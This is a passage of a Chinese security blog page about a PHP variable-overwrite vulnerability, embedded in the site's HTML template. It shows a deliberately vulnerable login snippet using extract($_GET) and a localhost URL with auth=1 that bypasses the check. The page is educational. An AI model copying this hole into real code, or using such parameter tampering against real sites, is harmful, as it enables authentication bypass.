+<h4 id="4-变量覆盖"><a href="#4-变量覆盖" class="headerlink" title="4.变量覆盖"></a>4.变量覆盖</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">变量如果未初始化，且能被用户所控制。<br>在php中，若register_globals 为on时尤其严重<br>此为全局变量覆盖漏洞<br>当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等。<br><br>变量覆盖实例<br><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$auth</span> = <span class="hljs-string">&#x27;0&#x27;</span>;  <br>extract(<span class="hljs-variable">$_GET</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$auth</span>==<span class="hljs-number">1</span>)&#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;登录成功!&quot;</span>;  <br>&#125;<span class="hljs-keyword">else</span>&#123;  <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;您还没有登录，请重新登录!&quot;</span>;  <br>&#125;  <br><span class="hljs-meta">?&gt;</span> <br>http:<span class="hljs-comment">//127.0.0.1/bian.php?auth=1</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHP安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">常见漏洞</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/03/24/msf%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%E5%A4%87%E5%BF%98%E5%BD%95/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">msf操作命令备忘录</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/03/24/web%E6%BC%8F%E6%B4%9E%20%20%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">
+                        <span class="hidden-mobile">文件解析漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div id="vcomments"></div>
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('vcomments', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function () {
+        new Valine({
+          el: "#vcomments",
+          app_id: "r1aoO2CU8pztHBXDkQYFikuI-gzGzoHsz",
+          app_key: "dJhm8HsnHbHaA1BVeojBc6MI",
+          placeholder: "Just go go",
+          path: window.location.pathname,
+          avatar: "mm",
+          meta: ["nick","mail","link"],
+          pageSize: "10",
+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
